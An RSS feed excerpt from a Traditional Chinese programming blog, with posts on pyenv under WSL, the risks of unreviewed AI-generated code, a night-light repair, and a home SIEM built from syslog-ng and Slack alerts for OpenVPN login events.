+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+# include .bashrc if it exists
+if [ -f "$HOME/.bashrc" ]; then
+. "$HOME/.bashrc"
+fi
+fi
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+PATH="$HOME/bin:$PATH"
+fi
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+PATH="$HOME/.local/bin:$PATH"
+fi
+</code></pre> <p>它只做三件事，若檔案或路徑存在，就執行 ~/.bashrc、將 ~/bin 及 ~/.local/bin 加入 $PATH。(若有設定 .bash_profile 或 .bash_login，則以其為準。因此我不用 zsh，照抄 Gist 做法純屬搞笑。)</p> <p>最後，pyenv 是怎麼做到動態切換 Python 版本？關鍵它在 .bashrc 裡加入的 <code>$(pyenv init - bash)</code>，pyenv 會在 ~/.pyenv/shims 下放入名為 pip、python 的執行腳本，而 ~/.pyenv/shims 又會被放到 PATH 的第一個，意思是當你輸入 python、pip 等指令，最先找到的會是 ~/.pyenv/shims/python 及 pip：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638946161188015298.png"></p> <p>而 ~/.pyenv/shims/python 長這樣：</p> <pre><code>#!/usr/bin/env bash
+set -e # 任何命令返回非零狀態碼時，立即退出腳本
+# 如果環境變數 PYENV_DEBUG 有值，顯示每個執行的命令
+[ -n "$PYENV_DEBUG" ] &amp;&amp; set -x
+# $0 是腳本名稱，${0##*/} 使用參數展開，移除 */ 前綴只留檔名
+program="${0##*/}"
+export PYENV_ROOT="/home/jeffrey/.pyenv"
+# 呼叫 ~/.pyenv/libexec/pyenv，參數分別為 exec、腳本名稱、所有原始參數
+exec "/home/jeffrey/.pyenv/libexec/pyenv" exec "$program" "$@"
+</code></pre> <p>現在我們都知道 pyenv 的祕密了 PO PO...</p> <p>「沒搞懂桯式原理，只知道這樣會動就用了」不就是現在當紅 Vibe Coding 寫照，下場也一樣，一旦結果未如預期，也沒有能力當場判斷與處理。此時你可以繼續爬文或問 AI，走神農氏嚐百草路線，繼續找來更多看不懂的東西瞎試；或是，試著搞懂原理，改用有邏輯的科學方法挖掘真相找到答案。有茶包射手魂的人，應當成為後者。</p> <p>耍了一次呆，花了一些時間，但補學到 WSL 繼承行為、.bashrc/.profile 觀念、pyenv 魔法的原理這些該學到的東西，不算浪費時間，也是很棒的一次經驗。</p> <p data-slug="pyenv-win-n-wsl" data-fbimg="https://cdn.pixabay.com/photo/2019/07/07/18/14/straw-4323010_960_720.jpg#960#720"> </p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig1_638946161184764327.png"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig1_638946161184764327.png" medium="image"/>
+    <pubDate>Sat, 27 Sep 2025 23:47:46 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[【閒聊】推廣 Vibe Coding 很好，但是否該開始加註警語了？]]></title>
+    <link>https://blog.darkthread.net/blog/vibe-coding-risk/</link>
+    <itunes:title><![CDATA[【閒聊】推廣 Vibe Coding 很好，但是否該開始加註警語了？]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>今天我 FB 上的洗版消息，莫過於某 Vibe Coding 講師，沒仔細檢查就將 AI 生成作品分享給大家，導致荷包大失血。</p> <p>程式雖然有設計了要使用者輸入自己 Gemini API Key 的介面，但 AI 生成的程式碼實際用的卻是寫在程式碼裡(依保哥的說法，也可能設在 Cloud Run) 的 API Key，結果作者不但分享了自己的程式，還慷慨地捐出 API 額度給大家用，導致 20 天燒掉一萬多塊，心疼荷包之餘，作者痛罵 Google 奸詐!</p> <p>程式寫久，鬼故事看得也多，我是很早就養成習慣 - 永遠不要把 API Key 或帳密寫進專案資料夾內的設定檔，存在環境變數、Key Vault、Registry 或其他資料夾都好，以免哪天失手不小心讓程式跟設定檔一起流出去。甚至資安偏執發作，我連環境變數都<a href="/blog/secure-apikey-for-console-app/">硬要用 Windows DPAPI 加密才安心</a>，這樣子，即使有人弄到加密版 API Key，不在我的電腦登入我的帳號也解不開。</p> <p>程式初學者犯錯很很常見的事，我年輕時犯過的錯多不勝數(當年在研討會聽到 SQL Injection 後冷汗直冒坐立難安，直想衝回公司改程式的記憶猶新。延伸閱讀：<a href="/blog/my-1st-sql-injection-project/">黑歷史 - 我的 SQL Injection 首部曲</a>)，程式 Bug 可大可小，若一旦跟資安有關，甚至可能讓人身敗名裂家破人亡。(歷史上還真的有因資安事件而死的悲慘案例: 軟體公司 LxLabs 的老板因公司產品內含SQL Injection漏洞導致 10 萬個網站被摧毁，承受不了壓力，選擇在家中懸樑自盡，延伸閱讀：<a href="/blog/info-sec-notes-20111222/">資安新聞筆記 - 開發網站前該知道的二三事</a>)</p> <p>因此，設計程式時本來就該如履薄冰，謹慎檢查程式碼，防範任何失誤可能造成的風險。不過，隨著 LLM 寫程式的能力日益強大，許多人沈浸在不用學程式也能寫程式的歡愉裡。現在的氣圍有點偏向：<a href="https://www.facebook.com/share/p/17dw1KhQpV/">有 Vibe Coding 誰都能寫程式，程式設計師都要失業惹，花時間學程式的人是傻子。</a></p> <p>謝謝這個案例，在 Vibe Coding 的一片歡樂中小小敲了一聲警鐘，適時提醒大家仍然要留意讓 AI 寫程式的風險。如果可以，能看懂 AI 生成的程式碼是最好的（自己檢查過還出事也就認了，好過死得不明不白），不然就別把它用在重要、影響重大的事情上。</p> <p>在鼓吹 Vibe Coding 多美好的同時，我想是該時候比照基金廣告的那段連珠砲(「投資一定有風險，基金投資有賺有賠，申購前應詳閱公開說明書」)，建議每次宣講結束都要加註一段警語：「Vibe Coding 一定有風險，生成結果可能出錯，發佈前應詳閱程式碼」。</p> <p data-slug="vibe-coding-risk" data-fbimg="https://i.postimg.cc/rzXrVjLC/image.png#1080#540"> </p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>今天我 FB 上的洗版消息，莫過於某 Vibe Coding 講師，沒仔細檢查就將 AI 生成作品分享給大家，導致荷包大失血。</p> <p>程式雖然有設計了要使用者輸入自己 Gemini API Key 的介面，但 AI 生成的程式碼實際用的卻是寫在程式碼裡(依保哥的說法，也可能設在 Cloud Run) 的 API Key，結果作者不但分享了自己的程式，還慷慨地捐出 API 額度給大家用，導致 20 天燒掉一萬多塊，心疼荷包之餘，作者痛罵 Google 奸詐!</p> <p>程式寫久，鬼故事看得也多，我是很早就養成習慣 - 永遠不要把 API Key 或帳密寫進專案資料夾內的設定檔，存在環境變數、Key Vault、Registry 或其他資料夾都好，以免哪天失手不小心讓程式跟設定檔一起流出去。甚至資安偏執發作，我連環境變數都<a href="/blog/secure-apikey-for-console-app/">硬要用 Windows DPAPI 加密才安心</a>，這樣子，即使有人弄到加密版 API Key，不在我的電腦登入我的帳號也解不開。</p> <p>程式初學者犯錯很很常見的事，我年輕時犯過的錯多不勝數(當年在研討會聽到 SQL Injection 後冷汗直冒坐立難安，直想衝回公司改程式的記憶猶新。延伸閱讀：<a href="/blog/my-1st-sql-injection-project/">黑歷史 - 我的 SQL Injection 首部曲</a>)，程式 Bug 可大可小，若一旦跟資安有關，甚至可能讓人身敗名裂家破人亡。(歷史上還真的有因資安事件而死的悲慘案例: 軟體公司 LxLabs 的老板因公司產品內含SQL Injection漏洞導致 10 萬個網站被摧毁，承受不了壓力，選擇在家中懸樑自盡，延伸閱讀：<a href="/blog/info-sec-notes-20111222/">資安新聞筆記 - 開發網站前該知道的二三事</a>)</p> <p>因此，設計程式時本來就該如履薄冰，謹慎檢查程式碼，防範任何失誤可能造成的風險。不過，隨著 LLM 寫程式的能力日益強大，許多人沈浸在不用學程式也能寫程式的歡愉裡。現在的氣圍有點偏向：<a href="https://www.facebook.com/share/p/17dw1KhQpV/">有 Vibe Coding 誰都能寫程式，程式設計師都要失業惹，花時間學程式的人是傻子。</a></p> <p>謝謝這個案例，在 Vibe Coding 的一片歡樂中小小敲了一聲警鐘，適時提醒大家仍然要留意讓 AI 寫程式的風險。如果可以，能看懂 AI 生成的程式碼是最好的（自己檢查過還出事也就認了，好過死得不明不白），不然就別把它用在重要、影響重大的事情上。</p> <p>在鼓吹 Vibe Coding 多美好的同時，我想是該時候比照基金廣告的那段連珠砲(「投資一定有風險，基金投資有賺有賠，申購前應詳閱公開說明書」)，建議每次宣講結束都要加註一段警語：「Vibe Coding 一定有風險，生成結果可能出錯，發佈前應詳閱程式碼」。</p> <p data-slug="vibe-coding-risk" data-fbimg="https://i.postimg.cc/rzXrVjLC/image.png#1080#540"> </p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>今天我 FB 上的洗版消息，莫過於某 Vibe Coding 講師，沒仔細檢查就將 AI 生成作品分享給大家，導致荷包大失血。</p> <p>程式雖然有設計了要使用者輸入自己 Gemini API Key 的介面，但 AI 生成的程式碼實際用的卻是寫在程式碼裡(依保哥的說法，也可能設在 Cloud Run) 的 API Key，結果作者不但分享了自己的程式，還慷慨地捐出 API 額度給大家用，導致 20 天燒掉一萬多塊，心疼荷包之餘，作者痛罵 Google 奸詐!</p> <p>程式寫久，鬼故事看得也多，我是很早就養成習慣 - 永遠不要把 API Key 或帳密寫進專案資料夾內的設定檔，存在環境變數、Key Vault、Registry 或其他資料夾都好，以免哪天失手不小心讓程式跟設定檔一起流出去。甚至資安偏執發作，我連環境變數都<a href="/blog/secure-apikey-for-console-app/">硬要用 Windows DPAPI 加密才安心</a>，這樣子，即使有人弄到加密版 API Key，不在我的電腦登入我的帳號也解不開。</p> <p>程式初學者犯錯很很常見的事，我年輕時犯過的錯多不勝數(當年在研討會聽到 SQL Injection 後冷汗直冒坐立難安，直想衝回公司改程式的記憶猶新。延伸閱讀：<a href="/blog/my-1st-sql-injection-project/">黑歷史 - 我的 SQL Injection 首部曲</a>)，程式 Bug 可大可小，若一旦跟資安有關，甚至可能讓人身敗名裂家破人亡。(歷史上還真的有因資安事件而死的悲慘案例: 軟體公司 LxLabs 的老板因公司產品內含SQL Injection漏洞導致 10 萬個網站被摧毁，承受不了壓力，選擇在家中懸樑自盡，延伸閱讀：<a href="/blog/info-sec-notes-20111222/">資安新聞筆記 - 開發網站前該知道的二三事</a>)</p> <p>因此，設計程式時本來就該如履薄冰，謹慎檢查程式碼，防範任何失誤可能造成的風險。不過，隨著 LLM 寫程式的能力日益強大，許多人沈浸在不用學程式也能寫程式的歡愉裡。現在的氣圍有點偏向：<a href="https://www.facebook.com/share/p/17dw1KhQpV/">有 Vibe Coding 誰都能寫程式，程式設計師都要失業惹，花時間學程式的人是傻子。</a></p> <p>謝謝這個案例，在 Vibe Coding 的一片歡樂中小小敲了一聲警鐘，適時提醒大家仍然要留意讓 AI 寫程式的風險。如果可以，能看懂 AI 生成的程式碼是最好的（自己檢查過還出事也就認了，好過死得不明不白），不然就別把它用在重要、影響重大的事情上。</p> <p>在鼓吹 Vibe Coding 多美好的同時，我想是該時候比照基金廣告的那段連珠砲(「投資一定有風險，基金投資有賺有賠，申購前應詳閱公開說明書」)，建議每次宣講結束都要加註一段警語：「Vibe Coding 一定有風險，生成結果可能出錯，發佈前應詳閱程式碼」。</p> <p data-slug="vibe-coding-risk" data-fbimg="https://i.postimg.cc/rzXrVjLC/image.png#1080#540"> </p>]]></content:encoded>
+    
+    <pubDate>Fri, 26 Sep 2025 11:54:06 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[【維修雜記】錯怪鼓包電池]]></title>
+    <link>https://blog.darkthread.net/blog/bad-phone-charger/</link>
+    <itunes:title><![CDATA[【維修雜記】錯怪鼓包電池]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>影片中的人體感應小夜燈，便宜又好用。一個不到 30 元，內建鋰電池可用 USB 充電，背後有磁吸，在黑暗中感應到人經過會自動點亮。我買了好幾個在家裡四處放，晚上熄燈後走到哪亮到哪，不用急著找電燈開關，很是方便。</p> <p><a href="https://www.youtube.com/watch?v=jXqfPkcttfA">故障人體感應小夜燈</a></p> <p>內建鋰電池容量不大，但 LED 耗電不多且夜間感應才亮燈，充一次電可以撐蠻久的，但如果就近充電的地點我還會會直接插上充電頭，把久久拿下來充電的工夫都省了。唯一的小問題是用個幾年鋰電池可能提前陣亡，有時還會導致小夜燈功能異常，但把電池拆掉還是可以繼續用。</p> <p>早上出門前，發現客廳的小夜燈持續一閃一閃且無法感應亮燈，依據過往經驗猜想是電池掛了，把握出門前十分鐘想來個快速維修，拆開發現電池有輕微鼓包證實我的推測，便手起刀落把電池拆了，沒想到燈還是一閃一閃... 登楞!!</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638944823004492694.jpg" alt="thumbnail"></p> <p>原來不是電池問題啊，此時我心中的嫌疑犯依序是 [1] 供電晶片 [2] 人體紅外線傳感器(PIR) [3] 控制晶片，但這三者任一個要換，先別說找不找得到零件了，光零件錢就比買新的還貴。</p> <p>此時眼角餘光瞄到它用的充電頭(照片中左側白色方塊)，來自某支雜牌玩具手機，且年代有點久遠，決定換顆充電頭試試... 幹! 原來是它壞了，原本換個充電頭就能解決的小事，我瞎忙一場。</p> <p>記取教訓，下回排查問題別太快用刻版印象下判斷，請從成本低廉的維修程序開始~</p> <p data-slug="bad-phone-charger" data-fbimg="https://i.postimg.cc/wMfjD0bQ/image.png"> </p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>影片中的人體感應小夜燈，便宜又好用。一個不到 30 元，內建鋰電池可用 USB 充電，背後有磁吸，在黑暗中感應到人經過會自動點亮。我買了好幾個在家裡四處放，晚上熄燈後走到哪亮到哪，不用急著找電燈開關，很是方便。</p> <p><a href="https://www.youtube.com/watch?v=jXqfPkcttfA">故障人體感應小夜燈</a></p> <p>內建鋰電池容量不大，但 LED 耗電不多且夜間感應才亮燈，充一次電可以撐蠻久的，但如果就近充電的地點我還會會直接插上充電頭，把久久拿下來充電的工夫都省了。唯一的小問題是用個幾年鋰電池可能提前陣亡，有時還會導致小夜燈功能異常，但把電池拆掉還是可以繼續用。</p> <p>早上出門前，發現客廳的小夜燈持續一閃一閃且無法感應亮燈，依據過往經驗猜想是電池掛了，把握出門前十分鐘想來個快速維修，拆開發現電池有輕微鼓包證實我的推測，便手起刀落把電池拆了，沒想到燈還是一閃一閃... 登楞!!</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638944823004492694.jpg" alt="thumbnail"></p> <p>原來不是電池問題啊，此時我心中的嫌疑犯依序是 [1] 供電晶片 [2] 人體紅外線傳感器(PIR) [3] 控制晶片，但這三者任一個要換，先別說找不找得到零件了，光零件錢就比買新的還貴。</p> <p>此時眼角餘光瞄到它用的充電頭(照片中左側白色方塊)，來自某支雜牌玩具手機，且年代有點久遠，決定換顆充電頭試試... 幹! 原來是它壞了，原本換個充電頭就能解決的小事，我瞎忙一場。</p> <p>記取教訓，下回排查問題別太快用刻版印象下判斷，請從成本低廉的維修程序開始~</p> <p data-slug="bad-phone-charger" data-fbimg="https://i.postimg.cc/wMfjD0bQ/image.png"> </p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>影片中的人體感應小夜燈，便宜又好用。一個不到 30 元，內建鋰電池可用 USB 充電，背後有磁吸，在黑暗中感應到人經過會自動點亮。我買了好幾個在家裡四處放，晚上熄燈後走到哪亮到哪，不用急著找電燈開關，很是方便。</p> <p><a href="https://www.youtube.com/watch?v=jXqfPkcttfA">故障人體感應小夜燈</a></p> <p>內建鋰電池容量不大，但 LED 耗電不多且夜間感應才亮燈，充一次電可以撐蠻久的，但如果就近充電的地點我還會會直接插上充電頭，把久久拿下來充電的工夫都省了。唯一的小問題是用個幾年鋰電池可能提前陣亡，有時還會導致小夜燈功能異常，但把電池拆掉還是可以繼續用。</p> <p>早上出門前，發現客廳的小夜燈持續一閃一閃且無法感應亮燈，依據過往經驗猜想是電池掛了，把握出門前十分鐘想來個快速維修，拆開發現電池有輕微鼓包證實我的推測，便手起刀落把電池拆了，沒想到燈還是一閃一閃... 登楞!!</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638944823004492694.jpg" alt="thumbnail"></p> <p>原來不是電池問題啊，此時我心中的嫌疑犯依序是 [1] 供電晶片 [2] 人體紅外線傳感器(PIR) [3] 控制晶片，但這三者任一個要換，先別說找不找得到零件了，光零件錢就比買新的還貴。</p> <p>此時眼角餘光瞄到它用的充電頭(照片中左側白色方塊)，來自某支雜牌玩具手機，且年代有點久遠，決定換顆充電頭試試... 幹! 原來是它壞了，原本換個充電頭就能解決的小事，我瞎忙一場。</p> <p>記取教訓，下回排查問題別太快用刻版印象下判斷，請從成本低廉的維修程序開始~</p> <p data-slug="bad-phone-charger" data-fbimg="https://i.postimg.cc/wMfjD0bQ/image.png"> </p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig1_638944823004492694.jpg"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig1_638944823004492694.jpg" medium="image"/>
+    <pubDate>Fri, 26 Sep 2025 11:16:08 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[在家做 SIEM - 讓家用無線路由器即時發送資安事件]]></title>
+    <link>https://blog.darkthread.net/blog/homebrew-siem-for-openvpn-connection-alert/</link>
+    <itunes:title><![CDATA[在家做 SIEM - 讓家用無線路由器即時發送資安事件]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>這些年我新學到不少資安名詞，<a href="https://www.microsoft.com/zh-tw/security/business/security-101/what-is-siem?WT.mc_id=DOP-MVP-37580">SIEM (Security Enformation and Event Management，安全性資訊與事件管理)</a>是其中之一，指的是即時收集、彙總及分析來自全組織應用程式、裝置、伺服器和使用者的大量資安相關資料，合併到單一整合式平台，以提供組織安全性態勢的全方位檢視，讓安全性作業中心 (Security Operation Center, SOC)(這是另一個資安名詞)能夠快速且有效地偵測、調查及回應安全性事件。</p> <p>身為平日疑神疑鬼、老擔心家裡無線路由器正被人偷連的網路被害妄想症患者 (我甚至幹過清查家裡所有平板手機 MAC 地址 + IP 造冊列管的瘋事，不意外地被家人當成有病)，在家裡搞一套 SIEM 也是很合情合理滴。我想做到每次有新裝置連上無線網站、用 OpenVPN 登入，要能第一時間接到通知。企業級的地端 SIEM 產品如 Splunk、QRadar 價格不斐，最近<a href="/blog/centos7-debian12-migrate/">家用迷你伺服器剛升級 Debian 12</a>，剛好可以跑 syslog-ng Docker 接收 Asus RT-AC66U syslog 訊息，再寫幾行程式<a href="/blog/azure-alert-slack/">串接 Slack 發即時通知</a>，不花一毛錢就能搞出一套簡單的資安事件即時通知機制。</p> <p>先說原理，Asus 路由器支援將所有 Log 轉發到指定的 syslog 伺服器：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638938874279311959.png"></p> <p>syslog 是一個古老的日誌傳輸與格式協定，裝置會傳送標註 facility(事件類別) 與 severity(嚴重度 0–7) 的訊息，並附帶時間與來源位址以便後續查詢與告警。在 Unix/Linux 系統上，可執行 rsyslog、syslog-ng 或 journald 等服務透過 UDP 514 (輕量但不保證送達)、TCP 514/601 或加密的 TLS (常見 6514) Port 接收第三方裝置送來的 Log。經過評估，syslog-ng 可用 Docker 架設，效能跟可擴充性不錯且使用者眾多，其來源/過濾/目的地的管線設計挺直覺，定義語法雖然得花點時間熟悉，但「遇到特定關鍵字可拋給外部自訂程式處理」的架構十分彈性，用 Bash、PowerShell、.NET 寫點程式再複雜的偵測與判斷邏輯都能實現，就決定是它了。</p> <p>我先用下面的 docker-compose.yaml 宣告 Docker 容器在 Debian 上跑 syslog-ng 服務，聽 514/601/6514 Port 接收遠端裝置的 syslog，/config 對映設定檔目錄放 syslog-ng.conf 設定檔、/var/log 對映 Log 目錄，再多設一個 /batch 來放自訂的訊息處理程式，<code>SLACK_CHANNEL</code>、<code>SLACK_BOT_TOKEN</code> 環境變數則用來發送 Slack 訊息用的：</p> <pre><code>---
+services:
+syslog-ng:
+image: lscr.io/linuxserver/syslog-ng:latest
+container_name: syslog-ng
+environment:
+- PUID=1000
+- PGID=1000
+- TZ=Etc/UTC
+- LOG_TO_STDOUT= #optional
+- SLACK_CHANNEL=資安通知
+- SLACK_BOT_TOKEN=xoxb-...&lt;slack-api-key&gt;...
+volumes:
+- ./config:/config
+- ./log:/var/log
+- ./batch:/batch
+ports:
+- 514:5514/udp
+- 601:6601/tcp
+- 6514:6514/tcp
+restart: unless-stopped
+</code></pre> <p>用 Slack 訊息我用得蠻多的，之前寫過 <a href="/blog/slack-api/">.NET Console 版</a> 和 <a href="/blog/azure-alert-slack/">ASP.NET Minimal API 版</a>，有 Github Copilot 撐腰，這回我嘗試直接用 Bash 腳本寫，再次擴展程式開發經驗：(註：Bash 腳本功能強大，實現各式邏輯都不成問題，但程式語法跟 JavaScript/C# 差異頗大，要上手得花點功夫，所幸現在寫 Bash 的苦差事可以交給 Copilot，我們學著看懂就好)</p> <pre><code>SLACK_TOKEN="${SLACK_BOT_TOKEN:-}"
+CHANNEL="${SLACK_CHANNEL:-}"
+usage() {
+echo "Usage:"
+echo "  $0 \"Your message\"                    # uses SLACK_CHANNEL env var"
+echo "  $0 \"#channel\" \"Your message\"         # specify channel as first arg"
+echo "  echo \"Your message\" | $0 \"#channel\"  # read message from stdin"
+echo "Environment:"
+echo "  SLACK_BOT_TOKEN   - required bot OAuth token (xoxb-...)"
+echo "  SLACK_CHANNEL     - optional default channel (used when only one arg)"
+exit 1
+}
+if [ -z "$SLACK_TOKEN" ]; then
+echo "Error: SLACK_BOT_TOKEN is not set."
+usage
+fi
+# Check if input is coming from pipeline
+if [ ! -t 0 ]; then
+# Read from stdin (pipeline)
+MESSAGE=$(cat)
+if [ "$#" -ge 1 ]; then
+CHANNEL="$1"
+else
+if [ -z "$CHANNEL" ]; then
+echo "Error: Channel not provided and SLACK_CHANNEL is not set."
+usage
+fi
+fi
+else
+# Read from command line arguments (existing logic)
+if [ "$#" -eq 0 ]; then
+usage
+elif [ "$#" -ge 2 ]; then
+CHANNEL="$1"
+shift
+MESSAGE="$*"
+else
+MESSAGE="$1"
+if [ -z "$CHANNEL" ]; then
+echo "Error: Channel not provided and SLACK_CHANNEL is not set."
+usage
+fi
+fi
+fi
+# simple JSON-escaping (handles backslashes, quotes, CR/LF)
+esc=${MESSAGE//\\/\\\\}
+esc=${esc//\"/\\\"}
+esc=${esc//$'\r'/\\r}
+esc=${esc//$'
+'/\
+}
+PAYLOAD="{\"channel\":\"${CHANNEL}\",\"text\":\"${esc}\"}"
+# send message
+RESP=$(curl -s -X POST "https://slack.com/api/chat.postMessage" \
+-H "Authorization: Bearer ${SLACK_TOKEN}" \
+-H "Content-Type: application/json; charset=utf-8" \
+--data "$PAYLOAD")
+if echo "$RESP" | grep -q '"ok":true'; then
+echo "Message posted"
+exit 0
+else
+echo "Slack API error"
+echo "$RESP"
+exit 2
+</code></pre> <p>先用 OpenVPN 連線事件當偵測對象，我鎖定以下三種事件，遇到特定關鍵字時將整條 Log 發送到 Slack 頻道，便能實現即時通知。</p> <ul><li>建立連線：Sep 21 13:32:41 vpnserver1[23420]: TCP connection established with [AF_INET6]::ffff:168.192.1.1:12345</li> <li>登入失敗：Sep 21 13:32:42 vpnserver1[23420]: 168.192.1.1:12345 TLS Auth Error: Auth Username/Password verification failed for peer</li> <li>登入成功：Sep 21 14:37:12 vpnserver1[16894]: client/168.192.1.1:12345 TLS: Username/Password authentication succeeded for username 'user'</li></ul> <p>要實現以上邏輯，./config/syslog-ng.config 的寫法如下：</p> <pre><code>@version: 4.2
+source s_net {
+udp(ip("0.0.0.0") port(5514)); # 設定接收 UDP 5514 及 6601
+syslog(ip("0.0.0.0") transport("tcp") port(6601));
+};
+destination d_file { # 將所有 Log 以日期分檔、月份分目錄保存備查
+file("/var/log/${YEAR}${MONTH}/${YEAR}-${MONTH}-${DAY}.log"
+create_dirs(yes)
+owner("1000") group("1000") perm(0644)
+template("$ISODATE $MSG
+")
+template_escape(no)
+);
+};
+filter f_openvpn { # 設定過濾器，偵測訊息是否出現特定關鍵字
+(message("TCP connection established with") or
+message("TLS: Username/Password authentication succeeded") or
+message("TLS Auth Error"))
+};
+destination d_post_slack { # 若符合過濾條件，將 Log 傳送給指定 Bash 腳本發送 Slack 通知
+program("/batch/post-loop.sh");
+};
+destination d_debug_file { # 偵錯用 Log，可用於輸出符合過濾條件的 Log，方便確認比對是否成功
+file("/var/log/debug.log"
+owner("1000") group("1000") perm(0644)
+template("$ISODATE $MSG
+")
+template_escape(no)
+);
+};
+log { # 設定 Pipeline
+source(s_net); # 來源 UDP 5514 /TCP 6601
+destination(d_file); # 一律寫入日期分檔 Log
+if {
+filter(f_openvpn); # 比對符合過濾條件才繼續往下執行
+# destination(d_debug_file);
+destination(d_post_slack); # 發送通知
+};
+};
+# echo "&lt;14&gt;Test UDP syslog message" | nc -u -w5 localhost 514
+</code></pre> <p>/batch/post-loop.sh 的寫法較特殊，要寫成無窮迴圈持續接收 stdin 傳入的內容，我原以為是一條訊息呼叫一次，搞錯觀念在這裡卡了一陣子。另外有個小眉角是每隔 20 分鐘 syslog-ng 會發送類似 Heartbeat 的 <code>MARK --</code> 訊息，要忽略以免收到無意義的通知。</p> <pre><code>#!/bin/bash
+while read line ; do
+# if it contains "MARK --" heartbeat, ignore it
+[[ "$line" == *"MARK --"* ]] &amp;&amp; continue
+echo $line | /batch/post-slack-msg.sh
+done
+</code></pre> <p>就醬，現在只要有人嘗試連線 OpenVPN 時我都會在 Slack 接到即時通知 (OpenVPN 預設 3600 秒自動重新協商 TLS 加密金鑰，持續連線時每小時會定期收到成功登入記錄)，甚至意外在週日晚上偵測到 <a href="/blog/abuseipdb/">AbusedIPDB 通報在案</a>的可疑 IP 跑來掃 Port：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638938874282476059.png"></p> <p>我的家用型土砲 SIEM 成功邁出第一步，哈!</p> <p data-slug="homebrew-siem-for-openvpn-connection-alert" data-fbimg="https://cdn.pixabay.com/photo/2018/04/07/08/27/plane-3297987_1280.jpg#1280#720"> </p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>這些年我新學到不少資安名詞，<a href="https://www.microsoft.com/zh-tw/security/business/security-101/what-is-siem?WT.mc_id=DOP-MVP-37580">SIEM (Security Enformation and Event Management，安全性資訊與事件管理)</a>是其中之一，指的是即時收集、彙總及分析來自全組織應用程式、裝置、伺服器和使用者的大量資安相關資料，合併到單一整合式平台，以提供組織安全性態勢的全方位檢視，讓安全性作業中心 (Security Operation Center, SOC)(這是另一個資安名詞)能夠快速且有效地偵測、調查及回應安全性事件。</p> <p>身為平日疑神疑鬼、老擔心家裡無線路由器正被人偷連的網路被害妄想症患者 (我甚至幹過清查家裡所有平板手機 MAC 地址 + IP 造冊列管的瘋事，不意外地被家人當成有病)，在家裡搞一套 SIEM 也是很合情合理滴。我想做到每次有新裝置連上無線網站、用 OpenVPN 登入，要能第一時間接到通知。企業級的地端 SIEM 產品如 Splunk、QRadar 價格不斐，最近<a href="/blog/centos7-debian12-migrate/">家用迷你伺服器剛升級 Debian 12</a>，剛好可以跑 syslog-ng Docker 接收 Asus RT-AC66U syslog 訊息，再寫幾行程式<a href="/blog/azure-alert-slack/">串接 Slack 發即時通知</a>，不花一毛錢就能搞出一套簡單的資安事件即時通知機制。</p> <p>先說原理，Asus 路由器支援將所有 Log 轉發到指定的 syslog 伺服器：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638938874279311959.png"></p> <p>syslog 是一個古老的日誌傳輸與格式協定，裝置會傳送標註 facility(事件類別) 與 severity(嚴重度 0–7) 的訊息，並附帶時間與來源位址以便後續查詢與告警。在 Unix/Linux 系統上，可執行 rsyslog、syslog-ng 或 journald 等服務透過 UDP 514 (輕量但不保證送達)、TCP 514/601 或加密的 TLS (常見 6514) Port 接收第三方裝置送來的 Log。經過評估，syslog-ng 可用 Docker 架設，效能跟可擴充性不錯且使用者眾多，其來源/過濾/目的地的管線設計挺直覺，定義語法雖然得花點時間熟悉，但「遇到特定關鍵字可拋給外部自訂程式處理」的架構十分彈性，用 Bash、PowerShell、.NET 寫點程式再複雜的偵測與判斷邏輯都能實現，就決定是它了。</p> <p>我先用下面的 docker-compose.yaml 宣告 Docker 容器在 Debian 上跑 syslog-ng 服務，聽 514/601/6514 Port 接收遠端裝置的 syslog，/config 對映設定檔目錄放 syslog-ng.conf 設定檔、/var/log 對映 Log 目錄，再多設一個 /batch 來放自訂的訊息處理程式，<code>SLACK_CHANNEL</code>、<code>SLACK_BOT_TOKEN</code> 環境變數則用來發送 Slack 訊息用的：</p> <pre><code>---
+services:
+syslog-ng:
+image: lscr.io/linuxserver/syslog-ng:latest
+container_name: syslog-ng
+environment:
+- PUID=1000
+- PGID=1000
+- TZ=Etc/UTC
+- LOG_TO_STDOUT= #optional
+- SLACK_CHANNEL=資安通知
+- SLACK_BOT_TOKEN=xoxb-...&lt;slack-api-key&gt;...
+volumes:
+- ./config:/config
+- ./log:/var/log
+- ./batch:/batch
+ports:
+- 514:5514/udp
+- 601:6601/tcp
+- 6514:6514/tcp
+restart: unless-stopped
